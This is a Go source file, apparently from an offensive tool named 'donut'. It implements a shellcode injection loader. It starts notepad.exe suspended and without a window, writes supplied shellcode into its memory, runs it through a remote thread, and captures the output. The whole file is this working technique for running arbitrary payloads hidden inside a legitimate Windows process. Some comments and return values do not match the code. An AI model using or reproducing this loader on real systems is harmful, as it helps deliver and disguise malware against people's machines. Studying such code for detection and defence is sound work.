package donut

import (
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

func Start(shellcode []byte) {
	stdoutBytes := make([]byte, 1)
	stderrBytes := make([]byte, 1)
	var eventCode uint32

	// Create sacrificial notepad.exe process in suspended state
	// using the CreateProcess() API call
	handle, stdout, stderr := createSuspendedProcess()

	// 3 sec sleep before process hollowing begins
	time.Sleep(3 * time.Second)

	// Run the shellcode and wait for it to complete
	task, _ := executeShellCode(shellcode, handle, stdout, &stdoutBytes, stderr, &stderrBytes, &eventCode)
	fmt.Println("Finished executing shellcode")

	if task {

		total := "Shellcode thread Exit Code: " + fmt.Sprint(eventCode) + "\n\n"

		total += "STDOUT:\n"
		total += string(stdoutBytes)
		total += "\n\n"

		total += "STDERR:\n"
		total += string(stderrBytes)

		fmt.Println(total)
	}

}

func createSuspendedProcess() (syscall.Handle, syscall.Handle, syscall.Handle) {

	// Create anonymous pipe for STDOUT
	var stdOutRead syscall.Handle
	var stdOutWrite syscall.Handle

	stdOutPipe := syscall.CreatePipe(&stdOutRead, &stdOutWrite, &syscall.SecurityAttributes{InheritHandle: 1}, 0)
	stdOutHandle := syscall.SetHandleInformation(stdOutRead, syscall.HANDLE_FLAG_INHERIT, 0)
	if stdOutPipe != nil && stdOutHandle != nil {
		fmt.Printf("Unable to create STDOUT pipe: %s", stdOutPipe.Error())
	}

	// Create anonymous pipe for STDERR
	var stdErrRead syscall.Handle
	var stdErrWrite syscall.Handle

	stdErrPipe := syscall.CreatePipe(&stdErrRead, &stdErrWrite, &syscall.SecurityAttributes{InheritHandle: 1}, 0)
	stdErrHandle := syscall.SetHandleInformation(stdErrRead, syscall.HANDLE_FLAG_INHERIT, 0)
	if stdErrPipe != nil && stdErrHandle != nil {
		fmt.Printf("Unable to create STDERR pipe: %s", stdErrPipe.Error())
	}

	// Additional info for CreateProcess() API call
	processInfo := &syscall.ProcessInformation{}
	startupInfo := syscall.StartupInfo{
		StdOutput:	stdOutWrite,
		StdErr:		stdErrWrite,
		Flags:		syscall.STARTF_USESTDHANDLES | 0x4,
		ShowWindow:	0,
	}

	// create the sacrificial calc.exe process
	createProcess := syscall.CreateProcess(
		nil,
		syscall.StringToUTF16Ptr("c:\\windows\\system32\\notepad.exe"),
		nil,
		nil,
		true,
		0x4|0x08000000, //CREATE_SUSPENDED and CREATE_NO_WINDOW
		nil,
		nil,
		&startupInfo,
		processInfo)

	if createProcess != nil && createProcess.Error() != "The operation completed successfully." {
		fmt.Printf("ERROR: CreateProcess -  %s", createProcess.Error())
	} else {
		fmt.Printf("INFO: notepad.exe started in suspended mode with PID: %d \n", processInfo.ProcessId)
	}

	// Close the stdout and stderr write handles
	closeHandle := syscall.CloseHandle(stdOutWrite)
	if closeHandle != nil {
		fmt.Printf("ERROR: closing the STDOUT write handle: %s", closeHandle.Error())
	}
	closeHandle = syscall.CloseHandle(stdErrWrite)
	if closeHandle != nil {
		fmt.Printf("ERROR: problem closing the STDERR write handle: %s", closeHandle.Error())
	}

	return processInfo.Process, stdOutRead, stdOutWrite
}

func executeShellCode(shellcode []byte, handle syscall.Handle, stdout syscall.Handle, stdoutBytes *[]byte, stderr syscall.Handle, stderrBytes *[]byte, eventCode *uint32) (bool, error){
	fmt.Println("VirtualAllocEx...")
	address, err := VirtualAllocEx(handle, 0, uintptr(len(shellcode)), 0x1000|0x2000, syscall.PAGE_EXECUTE_READ)
	if checkErrorMessage(err) {
		return false, err
	}

	var bytesWritten uintptr

	fmt.Println("WriteProcessMemory...")
	_, err = WriteProcessMemory(handle, address, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
	if checkErrorMessage(err) {
		return false, err
	}

	var threadHandle syscall.Handle

	fmt.Println("CreateRemoteThread...")
	threadHandle, err = CreateRemoteThread(handle, nil, 0, address, 0, 0, 0)
	if checkErrorMessage(err) {
		return false, err
	}

	fmt.Println("ReadFromPipes...")
	err = ReadFromPipes(stdout, stdoutBytes, stderr, stderrBytes)
	if checkErrorMessage(err) {
		err = nil
		// return false, err
	}

	fmt.Println("WaitForSingleObject...")
	*eventCode, err = WaitForSingleObject(threadHandle, 0xFFFFFFFF)
	if checkErrorMessage(err) {
		return false, err
	}

	fmt.Println("CloseHandle...")
	//Close the thread handle
	err = syscall.CloseHandle(threadHandle)
	if checkErrorMessage(err) {
		return false, err
	}

	fmt.Println("TerminateProcess...")
	//Terminate the sacrificial process
	err = TerminateProcess(handle, 0)

	fmt.Println("CloseProcessHandle...")
	//close Process Handle
	err = syscall.CloseHandle(handle)
	if checkErrorMessage(err) {
		return false, err
	}

	fmt.Println("CloseStdoutHandle...")
	//close stdout Handle
	err = syscall.CloseHandle(stdout)
	if checkErrorMessage(err) {
		return false, err
	}

	fmt.Println("CloseStderrHandle...")
	//close stderr Handle
	err = syscall.CloseHandle(stderr)
	if checkErrorMessage(err) {
		return false, err
	}
	fmt.Println("Success!!")
	return true, err
}

func checkErrorMessage(err error) bool {
	if err != nil && err.Error() != "The operation completed successfully." {
		println(err.Error())
		return true
	}
	return false
}